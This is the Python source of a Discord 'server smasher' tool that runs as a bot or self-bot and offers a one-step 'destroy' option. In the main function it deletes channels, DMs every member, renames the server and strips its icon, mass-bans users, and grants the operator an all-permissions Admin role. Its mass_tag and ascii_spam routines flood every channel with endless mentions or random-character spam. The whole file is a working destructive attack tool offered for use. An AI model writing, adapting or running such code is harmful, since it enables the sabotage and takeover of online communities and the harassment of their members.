import os
import sys
import time
import random
import string
import discord
import pyperclip
from discord import Permissions
import asyncio
from colorama import init
from termcolor import colored
from smconfig import *

lists = []
users = []
channellist = []

client = discord.Client()
init()

clear = lambda: os.system('cls')

print ("Make Sure you have modified smconfig.py before starting.")
@client.event
async def on_ready():
    clear()
    print("Logged in as")
    print("User: "+str(client.user.name))
    print("Bot is in the following channels: ")
    counter = -1
    for x in client.servers:
        counter += 1
        print(str(counter)+'. ('+str(x.id)+') '+str(x)+'\n')
        lists.append(x.id)
    print('----------------------------------------')
    a = int(input('Select the server to configure bot actions: '))
    SERVER = lists[int(a)]
    await main(SERVER)
    

async def main(SERVER):
    #options
    clear()
    server = client.get_server(id=SERVER)
    print ("Server: " + server.name)
    print ("Server ID: " + str(SERVER))
    print ("----------------------------------------")
    print ("Options:")
    print (colored(" 1. Destroy with config settings. \n 2. Create Server Invite. \n 3. Leave server.","green"))
    opts = input ("Select the number for your option: ")
    try:
        if int(opts) == 1:
            #actions
            for c in client.get_server(SERVER).channels:
                myperms = c.permissions_for(client.get_server(SERVER).get_member(client.user.id))
                if myperms.ban_members:
                    channellist.append(c)
            for i in client.get_server(SERVER).members:
                users.append(i)

            if chandel == True:
                print('Deleting channels.')
                for channels in channellist:
                    await client.delete_channel(channels)
                print('Finished deleting channels.')

            if senddm == True:
                for x in users:
                    try:
                        print (colored('Sending DM to ' + str(x),"blue"))
                        await client.send_message(x, dmcontent)
                    except Exception:
                        print (colored("Error sending DM to that user","red"))

            if namechange == True:
                serv = client.get_server(SERVER)
                await client.edit_server(server=serv, name=str(servname))

            if iconbegone == True:
                serv = client.get_server(SERVER)
                await client.edit_server(server=serv, icon=None)
                
            if changeicon == True:
                icofile = ".\\spammer\\serversmasher\\" + iconfile
                with open(icofile, 'rb') as handle:
                    icon = handle.read()
                    serv = client.get_server(SERVER)
                    await client.edit_server(serv, icon=icon)
                    
            if userban == True:
                for x in users:
                    if str(x) in userid:
                        print (colored("Not Banning " + str(x),"green"))
                    else:
                        print (colored('Banning ' + str(x),"blue"))
                        try:
                            await client.ban(x)
                        except Exception:
                            print(colored('Error Banning that user.',"red"))

            if gimmieadmin == True:
                server = client.get_server(SERVER)
                role = await client.create_role(server, name="Admin", permissions=Permissions.all())
                user = server.get_member(me)
                await client.add_roles(user, role)

            if createchan == True:
                print('Creating channels.')
                for x in range(int(channelno)):
                    Serv = discord.Server(id=SERVER)
                    if chanmethod.lower() == "ascii":
                        asc = ""
                        for x in range(60):
                            num = random.randrange(13000)
                            asc = asc + chr(num)
                        print (asc)
                        await client.create_channel(Serv, asc)
                    else:
                        await client.create_channel(Serv, channame)
            print('Channels Created. Preparing for next stage.')

            if spammethod == "asc":
                await ascii_spam(SERVER)
            if spammethod == "massment":
                await mass_tag(SERVER)
            
        elif int(opts) == 2:
               for server in client.servers:
                   for channel in server.channels:
                        if channel.type == discord.ChannelType.text:
                           invitelinknew = await client.create_invite(destination=channel, xkcd=True, max_uses=100)
                           invite = invitelinknew.url
                           pyperclip.copy(invite)
                           print (invite + " copied to clipboard.")
                           input ()
                           await main(SERVER)
                             
        elif int(opts) == 3:
            print ("Are you sure you want to leave this server? (Y/N): ")
            yn = input()
            if yn.lower() == 'y':
                toleave = client.get_server(SERVER)
                await client.leave_server(toleave)
                await on_ready()
            else:
                await main(SERVER)
    except Exception as e:
        print (colored("Error:","red"))
        print (colored(e,"red"))
        input()
        await main(SERVER)
async def mass_tag(SERVER):
    await asyncio.sleep(5)
    await client.wait_until_ready()
    msg = ' '
    for m in client.get_server(SERVER).members:
        msg += m.mention + ' '
    while not client.is_closed:
       for c in client.get_server(SERVER).channels:
            if c.type != discord.ChannelType.text:
               continue
            myperms = c.permissions_for(client.get_server(SERVER).get_member(client.user.id))
            if not myperms.send_messages:
                continue
            print('Mass Mentioning in: '+c.name)
            for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                try:
                    await client.send_message(c, m)
                except:
                    print('Error')

async def ascii_spam(SERVER):
    await asyncio.sleep(5)
    await client.wait_until_ready()
    while not client.is_closed:
       for c in client.get_server(SERVER).channels:
            if c.type != discord.ChannelType.text:
               continue
            myperms = c.permissions_for(client.get_server(SERVER).get_member(client.user.id))
            if not myperms.send_messages:
                continue
            print('Ascii Spamming in: '+c.name)
            asc = ""
            for x in range(1999):
                num = random.randrange(13000)
                asc = asc + chr(num)
            try:
                await client.send_message(c, asc)
            except:
                print('Error')

if clienttype.lower() == "user":
    client.run(token, bot=False)
if clienttype.lower() == "bot":
    client.run(token)

